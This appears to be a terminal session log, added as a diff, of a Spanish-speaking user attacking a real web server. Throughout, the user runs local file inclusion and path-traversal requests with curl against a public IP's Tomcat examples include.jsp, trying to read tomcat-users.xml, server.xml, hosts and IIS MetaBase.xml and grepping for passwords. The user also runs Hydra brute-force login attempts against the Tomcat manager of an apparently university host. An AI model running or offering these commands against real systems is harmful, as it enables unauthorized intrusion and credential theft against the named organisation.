@@ -1,0 +1,123 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ ./lfi_fixed.sh                         
+=== LFI MASIVO CORREGIDO ===
+Extrayendo: Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml
+  ❌ Falló o vacío: extracted_Program_Files_Apache_Software_Foundation_Tomcat_6.0_conf_tomcat-users.xml
+---
+Extrayendo: Program Files/Apache Software Foundation/Tomcat 6.0/conf/server.xml
+  ❌ Falló o vacío: extracted_Program_Files_Apache_Software_Foundation_Tomcat_6.0_conf_server.xml
+---
+Extrayendo: Tomcat 6.0/conf/tomcat-users.xml
+  ❌ Falló o vacío: extracted_Tomcat_6.0_conf_tomcat-users.xml
+---
+Extrayendo: Tomcat 6.0/conf/server.xml
+  ❌ Falló o vacío: extracted_Tomcat_6.0_conf_server.xml
+---
+Extrayendo: Tomcat 6.0/webapps/sito/WEB-INF/web.xml
+  ❌ Falló o vacío: extracted_Tomcat_6.0_webapps_sito_WEB-INF_web.xml
+---
+Extrayendo: WINDOWS/system32/drivers/etc/hosts
+  ❌ Falló o vacío: extracted_WINDOWS_system32_drivers_etc_hosts
+---
+Extrayendo: WINDOWS/system32/inetsrv/MetaBase.xml
+  ❌ Falló o vacío: extracted_WINDOWS_system32_inetsrv_MetaBase.xml
+---
+=== RESUMEN DE ARCHIVOS EXTRAÍDOS ===
+-rw-rw-r-- 1 marco-os marco-os    0 oct  8 22:07  extracted_creds.txt
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Program Files_Apache Software Foundation_Tomcat 6.0_conf_tomcat-users.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_conf_server.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_webapps_sito_WEB-INF_classes_application.properties.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_webapps_sito_WEB-INF_web.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:33  extracted_.._.._.._.._.._.._.._.._WINDOWS_system32_drivers_etc_hosts.txt
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_system.ini
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_win.ini
+-rw-rw-r-- 1 marco-os marco-os    0 oct  8 22:07  extracted_words.txt
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ cat extracted_creds.txt 
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ cat extracted_.._.._.._.._.._.._.._.._Program\ Files_Apache\ Software\ Foundation_Tomcat\ 6.0_conf_tomcat-users.xml.txt 
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ curl -k "https://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../../../../../Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml"
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+<body bgcolor="white">
+
+<font color="red">
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 NEnfoque.py            
+=== ANALIZANDO ACCESO A JSPs ===
+/jsp/index.jsp: 200
+   📝 FORMULARIO ENCONTRADO
+/jsp/login.jsp: 404
+/jsp/menu.jsp: 200
+   📝 FORMULARIO ENCONTRADO
+/jsp/admin/: 404
+/jsp/administracion/: 404
+/examples/jsp/: 200
+   📝 FORMULARIO ENCONTRADO
+   🔐 PÁGINA DE LOGIN
+/examples/jsp/jsp2/: 404
+/examples/jsp/snp/: 404
+
+=== CREANDO DICCIONARIO PERSONALIZADO ===
+=== FUERZA BRUTA DIRIGIDA AL MANAGER ===
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 19:31:36
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 285 login tries (l:15/p:19), ~18 tries per task
+[DATA] attacking http-get://sito.utslp.edu.mx:80/manager/html
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 19:32:08
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ echo "=== EXTRAYENDO METABASE.XML (IIS) ==="
+curl -k "https://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../../../../../WINDOWS/system32/inetsrv/MetaBase.xml" | grep -i "password\|username\|virtualdir"
+=== EXTRAYENDO METABASE.XML (IIS) ===
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3579    0  3579    0     0   9530      0 --:--:-- --:--:-- --:--:--  9544
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ curl -k "https://189.254.143.102/examples/jsp/include/include.jsp?page=../../../../../../../../WINNT/system32/inetsrv/MetaBase.xml"
+<html>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
